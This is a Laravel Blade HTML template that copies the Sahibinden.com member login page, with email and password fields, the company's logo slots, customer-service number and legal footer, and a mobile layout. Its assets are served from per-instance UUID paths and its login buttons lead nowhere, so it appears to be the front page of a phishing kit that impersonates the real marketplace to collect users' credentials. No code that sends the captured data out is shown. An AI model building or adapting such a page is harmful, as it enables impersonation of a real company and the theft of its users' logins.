<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sahibinden.com Uye Girişi</title>
    
 <link href="{{ asset("$uuid/css/style.css") }}" rel="stylesheet" type="text/css" >
 <link href="{{ asset("$uuid/css/style2.css") }}" rel="stylesheet" type="text/css" >


    <link rel="shortcut icon" type="image/x-icon" href="../{{ $uuid }}/img/fav.ico" >
</head>

<body>
    <div id="all">
        <div id="top" class="m-a">

            <a href=""><img src="../{{$uuid}}//img/sahibindensss.png" alt=""></a>

        </div>
        <!-- <script src="{{ asset("$uuid/js/haeder.js") }}"></script>  
 <link rel="shortcut icon" type="image/x-icon" href="../{{ $uuid }}/images/favicon.ico" > -->


        <div id="main-m" class="dp-f m-a">

            <div class="middle" class="">

                <div id="Qr-Code">
                    <img class="clip" src="../{{$uuid}}/img/qr.png" alt="">
                </div>

                <div id="uye-txt">Üye Girişi</div>

                <p class="link-sifre m-bot"></p>
                <input type="text" class="input-txt" tabindex="1" placeholder="E-posta" type="text" autocapitalize="none" value="">
                <input type="text" class="input-txt" tabindex="2" placeholder="Şifre" type="password" autocapitalize="none" value="">
                <div id="remember-btn" class="m-a m-top"><input type="checkbox" name="ders" id="btn" value="Beni Hatırla"> Oturumum açık kalsın
                    <div class="link-sifre">
                        <p class="">
                            <a href="">Şifremi Unuttum</a></p>
                    </div>
                </div>
                <a id="ilerle" href="#" class="link" style="color: white;">Giriş Yap</a>
                <p class="henuz" style="text-align: center;"> Henüz üye değil misin? <a class="renk-uye" href="">Üye Ol</a></p>
                </p>
                <div id="m-footer-div">Bu site reCAPTCHA ile korunmaktadır. Google
                    <a class="f-link" href="">Gizlilik Politikası</a> ve
                    <a class="f-link" href="">Kullanım Koşulları</a> geçerlidir. </div>
            </div>

        </div>

        <div id="footer">
            <div id="f-top" class="dp-f">
                <div id="f-left" class="dp-f">
                    <div class="f-l-left dp-f">
                        <img class="img-f-left" src="../{{$uuid}}/img/Adsız.png" alt="">
                        <p class="f-img-txt"><span class="f-img-span-1">7/24 Müşteri Hizmetleri</span><br>
                            <span style="color: #555; font-weight: bold;">0 850 222 44 44</span></p>
                    </div>

                    <div class="f-l-left dp-f">
                        <img class="img-f-left" src="../{{$uuid}}/img/1.png" alt="">
                        <p class="f-img-txt"><span>Yardım Merkezi</span><br>
                            <span><a class="f-link" style="color: #555;  font-weight: bold;"
                                href="">yardim.sahibinden.com</a></span></p>
                    </div>



                </div>

                <a href=""><img id="f-right-img" src="../{{$uuid}}/img/2.png" alt=""></a>
            </div>

            <div id="f-mid" class=" dp-f">
                <div id="f-m-left">

                    sahibinden.com'da yer alan kullanıcıların oluşturduğu tüm içerik, görüş ve bilgilerin doğruluğu, eksiksiz ve değişmez olduğu, yayınlanması ile ilgili yasal yükümlülükler içeriği oluşturan kullanıcıya aittir. Bu içeriğin, görüş ve bilgilerin yanlışlık,
                    eksiklik veya yasalarla düzenlenmiş kurallara aykırılığından sahibinden.com hiçbir şekilde sorumlu değildir. Sorularınız için ilan sahibi ile irtibata geçebilirsiniz. Yer Sağlayıcı Belge No : 581

                </div>
                <a href=""><img alt="" src="../{{$uuid}}/img/etbis.png" id="f-m-right"></img>
                </a>
                
            </div>

        </div>
       
    </div>
    <!-- Mobile Screen -->
    <div id="mobile-top" class="dp-f">
        <div id="back-unicode"><a href="">&#8249;</a></div>
        <div id="mb-txt-one">Üye Girisi</div>
    </div>

    <div id="mobile-middle">

        <div class="mb-txt-question">E-posta Adresiniz</div>
        <input type="text" class="mb-input-txt">
        <div class="mb-txt-question">Şifreniz
            <a href="javascript:" class="show-hide-trigger"></a>
        </div>
        <input type="text" class="mb-input-txt">


        <div id="mb-remember-btn">

            <div><input type="checkbox" name="ders" id="btn" value="Beni Hatırla"> Beni Hatırla</div>

            <a href="" class="dp-b link" style="color: #33628e;">Şifremi Unuttum</a></div>

        <a id="ilerle-two" href="#" class="link" style="color: white;">Giriş Yap</a>

        <a href="" id="uye-ol" class="link">Hemen Üye Ol</a>

        <div id="m-footer-div-two">Bu site reCAPTCHA ile korunmaktadır. Google
            <a class="f-link" href="">Gizlilik Politikası</a> ve
            <a class="f-link" href="">Kullanım Koşulları</a> geçerlidir. </div>
    </div>
</body>

</html>